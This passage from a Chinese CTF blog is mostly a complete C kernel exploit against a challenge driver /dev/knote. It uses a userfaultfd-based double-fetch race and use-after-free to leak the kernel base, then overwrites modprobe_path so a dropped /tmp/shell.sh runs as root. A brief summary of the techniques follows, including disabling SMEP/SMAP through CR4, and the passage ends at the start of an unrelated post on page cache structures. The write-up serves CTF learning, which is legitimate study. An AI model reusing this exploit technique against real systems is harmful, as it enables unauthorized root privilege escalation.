class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEV_NAME <span class="meta-string">&quot;/dev/knote&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPRAY_COUNT 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD_NOTE 0x1337</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EDIT_NOTE 0x8888</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELE_NOTE 0x6666</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_NOTE 0x2333</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> modprobe_path_offset 0x145c5c0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MOD_PROBE 0x145c5c0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> modprobe_path;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">int</span> tty_fd;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">size_id</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> id;</span><br><span class="line">    <span class="keyword">uint32_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Data</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="keyword">size_t</span> size;</span><br><span class="line">        <span class="keyword">size_t</span> index;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">void</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FDinit</span><span class="params">()</span></span>&#123;</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/knote&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fd wrong!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *msg)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">puts</span>(msg);</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">size_t</span> size)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Data</span> <span class="title">data</span>;</span></span><br><span class="line">    data.size = size;</span><br><span class="line">    data.buf = <span class="literal">NULL</span>;</span><br><span class="line">    ioctl(fd,ADD_NOTE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get</span><span class="params">(<span class="keyword">size_t</span> index,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Data</span> <span class="title">data</span>;</span></span><br><span class="line">    data.index = index;</span><br><span class="line">    data.buf = buf;</span><br><span class="line">    ioctl(fd,GET_NOTE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">size_t</span> index,<span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Data</span> <span class="title">data</span>;</span></span><br><span class="line">    data.index = index;</span><br><span class="line">    data.buf = buf;</span><br><span class="line">    ioctl(fd,EDIT_NOTE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dele</span><span class="params">(<span class="keyword">size_t</span> index)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Data</span> <span class="title">data</span>;</span></span><br><span class="line">    data.index = index;</span><br><span class="line">    data.buf = <span class="literal">NULL</span>;</span><br><span class="line">    ioctl(fd,DELE_NOTE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">handler</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[+] leak_handler created&quot;</span>);</span><br><span class="line">   sleep(<span class="number">3</span>); </span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">   <span class="keyword">int</span> nready;</span><br><span class="line">   pollfd.fd = uffd;</span><br><span class="line">   pollfd.events = POLLIN;</span><br><span class="line"></span><br><span class="line">   nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">   <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">      errExit(<span class="string">&quot;[-] Wrong pool return value&quot;</span>);</span><br><span class="line">   nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">   <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">      errExit(<span class="string">&quot;[-]msg error!!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">char</span> *page = (<span class="keyword">char</span>*)mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">   <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">      errExit(<span class="string">&quot;[-]mmap page error!!&quot;</span>);</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">   uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">   uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);;</span><br><span class="line">   uc.len = PAGE_SIZE;</span><br><span class="line">   uc.mode = <span class="number">0</span>;</span><br><span class="line">   uc.copy = <span class="number">0</span>;</span><br><span class="line">   ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[+] leak_handler done!!&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">userfault</span><span class="params">(<span class="keyword">void</span> *fault_page,<span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">pthread_t</span> thr;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">   <span class="keyword">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">   ua.api = UFFD_API;</span><br><span class="line">   ua.features = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">      errExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"> </span><br><span class="line">   ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page; </span><br><span class="line">   ur.range.len   = PAGE_SIZE;</span><br><span class="line">   ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">   <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>) </span><br><span class="line">      errExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span>*)uffd);</span><br><span class="line">   <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">      errExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">leakbase</span><span class="params">()</span></span>&#123;</span><br><span class="line">    add(<span class="number">0x2e0</span>);</span><br><span class="line">    <span class="keyword">char</span> *user_buf = (<span class="keyword">char</span>*)mmap(<span class="literal">NULL</span>,PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (user_buf == MAP_FAILED)</span><br><span class="line">        errExit(<span class="string">&quot;[-] mmap user_buf error!!&quot;</span>);</span><br><span class="line">    userfault(user_buf, handler);</span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-]fork error!!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123; </span><br><span class="line">        sleep(<span class="number">1</span>); </span><br><span class="line">        dele(<span class="number">0</span>); <span class="comment">// free</span></span><br><span class="line">        tty_fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>,O_RDWR); <span class="comment">// change </span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        get(<span class="number">0</span>,user_buf); <span class="comment">// handler start</span></span><br><span class="line">        <span class="keyword">size_t</span> *data = (<span class="keyword">size_t</span> *)user_buf;</span><br><span class="line">        <span class="keyword">if</span> (data[<span class="number">7</span>] == <span class="number">0</span>) &#123; </span><br><span class="line">            munmap(user_buf, PAGE_SIZE);</span><br><span class="line">            close(tty_fd);</span><br><span class="line">            errExit(<span class="string">&quot;[-]leak data error!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        close(tty_fd); </span><br><span class="line">        <span class="keyword">size_t</span> x_fun_addr = data[<span class="number">0x56</span>];</span><br><span class="line">        <span class="keyword">size_t</span> kernel_base = x_fun_addr - <span class="number">0x5d4ef0</span>;</span><br><span class="line">        modprobe_path = kernel_base + MOD_PROBE;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;kernel_base=0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;modprobe_path=0x%lx\n&quot;</span>,modprobe_path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">write_handler</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[+] write_handler created&quot;</span>);</span><br><span class="line">   sleep(<span class="number">3</span>); </span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">   <span class="keyword">int</span> nready;</span><br><span class="line">   pollfd.fd = uffd;</span><br><span class="line">   pollfd.events = POLLIN;</span><br><span class="line"></span><br><span class="line">   nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">   <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">      errExit(<span class="string">&quot;[-] Wrong pool return value&quot;</span>);</span><br><span class="line">   nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">   <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">      errExit(<span class="string">&quot;[-]msg error!!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">char</span> *page = (<span class="keyword">char</span>*)mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">   <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">      errExit(<span class="string">&quot;[-]mmap page error!!&quot;</span>);</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">   <span class="built_in">memcpy</span>(page,&amp;modprobe_path,<span class="number">8</span>); <span class="comment">// make modprobe_path to user_buf</span></span><br><span class="line">   uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">   uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);;</span><br><span class="line">   uc.len = PAGE_SIZE;</span><br><span class="line">   uc.mode = <span class="number">0</span>;</span><br><span class="line">   uc.copy = <span class="number">0</span>;</span><br><span class="line">   ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[+] write_handler done!!&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">writeheap</span><span class="params">()</span></span>&#123;</span><br><span class="line">    add(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">char</span> *user_buf = (<span class="keyword">char</span>*)mmap(<span class="literal">NULL</span>,PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (user_buf == MAP_FAILED)</span><br><span class="line">        errExit(<span class="string">&quot;[-] mmap user_buf error!!&quot;</span>);</span><br><span class="line">    userfault(user_buf,write_handler);</span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-]fork error!!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123; </span><br><span class="line">        sleep(<span class="number">1</span>); </span><br><span class="line">        dele(<span class="number">0</span>); <span class="comment">// free </span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        edit(<span class="number">0</span>,user_buf); <span class="comment">// start write_handler</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> page_size;</span><br><span class="line"><span class="keyword">uint64_t</span> fault_page;</span><br><span class="line"><span class="keyword">uint64_t</span> fault_page_len;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> heap_addr;</span><br><span class="line"><span class="keyword">uint64_t</span> kernel_base;</span><br><span class="line"><span class="keyword">uint64_t</span> modprobe_path;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> tmp[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    FDinit();</span><br><span class="line">    leakbase();</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    writeheap();</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    add(<span class="number">0x100</span>);</span><br><span class="line">    add(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(tmp,<span class="string">&quot;/tmp/shell.sh&quot;</span>);</span><br><span class="line">    edit(<span class="number">1</span>,tmp);</span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh&#x27; &gt; /tmp/shell.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;chmod 777 /flag&#x27; &gt;&gt; /tmp/shell.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/shell.sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">    sleep(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这个 exp 很大程度上借鉴了 ha1vk 大佬的博客</li>
<li>之后我发现，只要 <code>memcpy</code> 复制了一个内核地址到 <code>page</code>，那么把该 <code>page</code> 的内容打印出来就是 <code>0xffffffc0</code>（实际上是正确的数据），不知道这是不是内核的保护机制</li>
</ul>
<hr>
<p><strong>小结：</strong></p>
<p>学到了 <code>Double Fetch</code> 和 <code>modprobe_path attack</code>：</p>
<ul>
<li><code>Double Fetch</code>：如果 <code>copy_user</code> 系列函数使用的是全局变量并且没有加锁，就可以使用这个方法</li>
<li><code>modprobe_path attack</code>：对于 5.0 版本以上的内核很难使用 ROP 来绕过 smep，这种攻击算一种替代名，还可以利用 <code>mov cr4,xxx</code> 使得 CR4 寄存器的第21/22位为“0”，即可关闭 smap/smep</li>
</ul>
<p>现在对这个利用还不熟，只能用用模板，感觉 userfaultfd 机制有点难理解（还不清楚为什么模板要这么写），之后抽时间了解一下 </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/23/Linux%20Page%20Cache&Swap%20Cache/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/23/Linux%20Page%20Cache&Swap%20Cache/" class="post-title-link" itemprop="url">Linux Page Cache&Swap Cache</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-10-23 14:26:08" itemprop="dateCreated datePublished" datetime="2022-10-23T14:26:08+08:00">2022-10-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-10-27 19:54:00" itemprop="dateModified" datetime="2022-10-27T19:54:00+08:00">2022-10-27</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Struct address_space</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> flags</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span>;</span></span><br><span class="line">            ......</span><br></pre></td></tr></table></figure>
<ul>
<li>在结构体 <code>page</code> 中有一个特殊的成员 <code>mapping</code>，指向地址空间描述的结构指针</li>
<li>结构体 <code>file</code> 和结构体 <code>inode</code> 中都有一个结构体 <code>address_space</code> 指针（<code>file-&gt;f_mapping</code> 是由 <code>inode-&gt;i_mapping</code> 初始化而来）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span>		*<span class="title">host</span>;</span> <span class="comment">/* 拥有此address_space的inode对象 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xarray</span>		<span class="title">i_pages</span>;</span> <span class="comment">/* 缓存的页面(一种抽象的数据类型,其行为类似于一个非常大的指针数组) */</span></span><br><span class="line">	<span class="keyword">gfp_t</span>			gfp_mask; <span class="comment">/* 用于分配页的内存分配标志 */</span></span><br><span class="line">	<span class="keyword">atomic_t</span>		i_mmap_writable; <span class="comment">/* VM_SHARED计数 */</span></span><br><span class="line">	<span class="class"><span 